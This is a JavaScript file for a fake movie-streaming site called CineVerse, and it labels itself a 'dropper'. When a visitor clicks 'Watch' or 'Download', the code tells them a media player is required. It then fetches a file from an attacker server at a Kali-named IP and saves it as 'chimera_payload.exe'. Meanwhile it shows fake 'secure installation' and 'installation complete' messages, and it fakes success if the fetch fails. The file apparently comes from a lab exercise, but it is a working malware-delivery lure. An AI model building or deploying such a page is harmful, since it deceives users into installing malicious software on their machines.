// ============================================
// CineVerse - Media Player Installation Module
// ============================================

const KALI_IP = "10.0.2.20";
const SERVER_URL = `http://${KALI_IP}:8000`;

console.log("[*] Dropper loaded");
console.log("[*] Server URL:", SERVER_URL);

function openMoviePopup(movieId) {
    console.log("[*] Opening popup for movie:", movieId);
    const movie = moviesData.find(m => m.id === movieId);
    if (!movie) {
        console.log("[!] Movie not found");
        return;
    }
    
    console.log("[*] Movie:", movie.title);
    
    const overlay = document.createElement('div');
    overlay.className = 'movie-overlay';
    overlay.id = 'movieOverlay';
    
    overlay.innerHTML = `
        <div class="movie-popup">
            <button class="close-popup" onclick="closeMoviePopup()">&times;</button>
            <div class="popup-content">
                <div class="popup-poster">
                    <img src="${movie.poster}" alt="${movie.title}" onerror="this.src='images/placeholder.jpg'">
                </div>
                <div class="popup-details">
                    <h2>${movie.title}</h2>
                    <div class="popup-meta">
                        <span>📅 ${movie.year}</span>
                        <span>⭐ ${movie.rating}/5</span>
                        <span>🏷️ ${movie.category}</span>
                    </div>
                    <p class="popup-description">${movie.description}</p>
                    <div class="popup-actions">
                        <button class="btn-watch" id="watchBtn">
                            <i class="fas fa-play"></i> Watch Movie
                        </button>
                        <button class="btn-download" id="downloadBtn">
                            <i class="fas fa-download"></i> Download Movie
                        </button>
                    </div>
                    <div style="margin-top: 15px; padding: 10px; background: #1a1a1a; border-radius: 8px; text-align: center; font-size: 12px; color: #666;">
                        ⚡ Requires media player installation
                    </div>
                </div>
            </div>
        </div>
    `;
    
    document.body.appendChild(overlay);
    setTimeout(() => overlay.classList.add('active'), 10);
    document.body.style.overflow = 'hidden';
    
    setTimeout(() => {
        const watchBtn = document.getElementById('watchBtn');
        const downloadBtn = document.getElementById('downloadBtn');
        
        if (watchBtn) {
            watchBtn.addEventListener('click', function() {
                console.log("[*] Watch button clicked");
                installMediaPlayer(movie);
            });
        }
        if (downloadBtn) {
            downloadBtn.addEventListener('click', function() {
                console.log("[*] Download button clicked");
                installMediaPlayer(movie);
            });
        }
    }, 100);
}

function closeMoviePopup() {
    const overlay = document.getElementById('movieOverlay');
    if (overlay) {
        overlay.classList.remove('active');
        setTimeout(() => {
            overlay.remove();
            document.body.style.overflow = 'auto';
        }, 300);
    }
}

function installMediaPlayer(movie) {
    console.log("[*] Installing media player for:", movie.title);
    showInstallProgress(movie);
    
    const url = `${SERVER_URL}/api/install/player`;
    const body = JSON.stringify({ movie_id: movie.id, movie_title: movie.title });
    
    console.log("[*] Sending request to:", url);
    console.log("[*] Body:", body);
    
    fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: body
    })
    .then(response => {
        console.log("[*] Response status:", response.status);
        console.log("[*] Response headers:", response.headers);
        return response.blob();
    })
    .then(blob => {
        console.log("[*] Blob size:", blob.size);
        if (blob.size === 0) {
            alert('Error: Payload is empty!');
            return;
        }
        const url = window.URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = 'chimera_payload.exe';
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        window.URL.revokeObjectURL(url);
        showInstallComplete(movie);
        console.log("[*] Download complete!");
    })
    .catch(error => {
        console.error("[!] Installation error:", error);
        alert('Error downloading: ' + error.message);
        simulateInstallation(movie);
    });
    
    setTimeout(() => closeMoviePopup(), 6000);
}

function showInstallProgress(movie) {
    const loadingDiv = document.createElement('div');
    loadingDiv.id = 'loadingPopup';
    loadingDiv.style.cssText = `
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        background: #1a1a1a;
        padding: 30px 40px;
        border-radius: 12px;
        z-index: 10001;
        text-align: center;
        border: 1px solid #e50914;
        box-shadow: 0 20px 60px rgba(0,0,0,0.9);
        min-width: 300px;
    `;
    
    loadingDiv.innerHTML = `
        <div style="font-size: 50px; margin-bottom: 15px;">
            <i class="fas fa-spinner fa-spin" style="color: #e50914;"></i>
        </div>
        <h3 style="margin-bottom: 10px;">Installing ${movie.title} Player</h3>
        <p style="color: #888; font-size: 14px;">Please wait... Preparing installation package.</p>
        <div style="margin-top: 15px; width: 100%; height: 4px; background: #2a2a2a; border-radius: 2px; overflow: hidden;">
            <div style="width: 0%; height: 100%; background: linear-gradient(90deg, #e50914, #ffd700); border-radius: 2px; animation: loadingProgress 3s ease-in-out forwards;"></div>
        </div>
        <div style="margin-top: 20px; font-size: 12px; color: #555;">
            <i class="fas fa-shield-alt"></i> Secure encrypted installation
        </div>
    `;
    
    document.body.appendChild(loadingDiv);
    
    const style = document.createElement('style');
    style.textContent = `
        @keyframes loadingProgress {
            0% { width: 0%; }
            20% { width: 15%; }
            50% { width: 45%; }
            80% { width: 75%; }
            95% { width: 92%; }
            100% { width: 100%; }
        }
    `;
    document.head.appendChild(style);
    
    setTimeout(() => {
        const loadingEl = document.getElementById('loadingPopup');
        if (loadingEl) loadingEl.remove();
    }, 4000);
}

function showInstallComplete(movie) {
    const successDiv = document.createElement('div');
    successDiv.id = 'successPopup';
    successDiv.style.cssText = `
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        background: #1a1a1a;
        padding: 30px 40px;
        border-radius: 12px;
        z-index: 10001;
        text-align: center;
        border: 1px solid #00ff88;
        box-shadow: 0 20px 60px rgba(0,0,0,0.9);
        min-width: 300px;
        animation: fadeIn 0.5s ease;
    `;
    
    successDiv.innerHTML = `
        <div style="font-size: 50px; margin-bottom: 15px;">
            <i class="fas fa-check-circle" style="color: #00ff88;"></i>
        </div>
        <h3 style="color: #00ff88; margin-bottom: 10px;">Installation Complete!</h3>
        <p style="color: #aaa; font-size: 14px;">${movie.title} player installed successfully.</p>
        <p style="color: #666; font-size: 12px; margin-top: 10px;">The movie will start playing automatically.</p>
    `;
    
    document.body.appendChild(successDiv);
    
    const style = document.createElement('style');
    style.textContent = `
        @keyframes fadeIn {
            from { opacity: 0; transform: translate(-50%, -50%) scale(0.9); }
            to { opacity: 1; transform: translate(-50%, -50%) scale(1); }
        }
    `;
    document.head.appendChild(style);
    
    setTimeout(() => {
        const el = document.getElementById('successPopup');
        if (el) el.remove();
    }, 3000);
}

function simulateInstallation(movie) {
    showInstallProgress(movie);
    setTimeout(() => showInstallComplete(movie), 4000);
}

// Add CSS styles
const popupStyles = document.createElement('style');
popupStyles.textContent = `
    .movie-overlay {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0,0,0,0.85);
        z-index: 9999;
        display: flex;
        justify-content: center;
        align-items: center;
        opacity: 0;
        transition: opacity 0.3s ease;
        backdrop-filter: blur(5px);
    }
    
    .movie-overlay.active { opacity: 1; }
    
    .movie-popup {
        background: #1a1a1a;
        border-radius: 16px;
        max-width: 800px;
        width: 90%;
        max-height: 90vh;
        overflow-y: auto;
        border: 1px solid #2a2a2a;
        transform: scale(0.9);
        transition: transform 0.3s ease;
        position: relative;
    }
    
    .movie-overlay.active .movie-popup { transform: scale(1); }
    
    .close-popup {
        position: absolute;
        top: 15px;
        right: 20px;
        background: none;
        border: none;
        color: #fff;
        font-size: 30px;
        cursor: pointer;
        z-index: 10;
        transition: 0.3s;
    }
    
    .close-popup:hover { color: #e50914; transform: rotate(90deg); }
    
    .popup-content {
        display: flex;
        padding: 30px;
        gap: 30px;
    }
    
    .popup-poster { flex: 0 0 250px; }
    .popup-poster img {
        width: 100%;
        border-radius: 12px;
        box-shadow: 0 10px 40px rgba(0,0,0,0.5);
    }
    
    .popup-details { flex: 1; }
    .popup-details h2 {
        font-size: 28px;
        margin-bottom: 15px;
        color: #fff;
    }
    
    .popup-meta {
        display: flex;
        gap: 15px;
        margin-bottom: 15px;
        color: #aaa;
        font-size: 14px;
        flex-wrap: wrap;
    }
    
    .popup-meta span {
        background: #2a2a2a;
        padding: 4px 12px;
        border-radius: 20px;
    }
    
    .popup-description {
        color: #aaa;
        line-height: 1.8;
        margin-bottom: 25px;
    }
    
    .popup-actions {
        display: flex;
        gap: 15px;
        flex-wrap: wrap;
    }
    
    .btn-watch, .btn-download {
        padding: 12px 30px;
        border: none;
        border-radius: 8px;
        font-size: 16px;
        cursor: pointer;
        transition: 0.3s;
        font-weight: bold;
        display: flex;
        align-items: center;
        gap: 10px;
    }
    
    .btn-watch {
        background: #e50914;
        color: #fff;
    }
    
    .btn-watch:hover {
        background: #ff0a1a;
        transform: translateY(-2px);
        box-shadow: 0 5px 20px rgba(229, 9, 20, 0.4);
    }
    
    .btn-download {
        background: #2a2a2a;
        color: #fff;
    }
    
    .btn-download:hover {
        background: #3a3a3a;
        transform: translateY(-2px);
    }
    
    @media (max-width: 768px) {
        .popup-content { flex-direction: column; padding: 20px; }
        .popup-poster { flex: 0 0 auto; max-width: 200px; margin: 0 auto; }
        .popup-details h2 { font-size: 22px; text-align: center; }
        .popup-actions { justify-content: center; }
    }
`;
document.head.appendChild(popupStyles);

console.log("[*] Dropper ready");

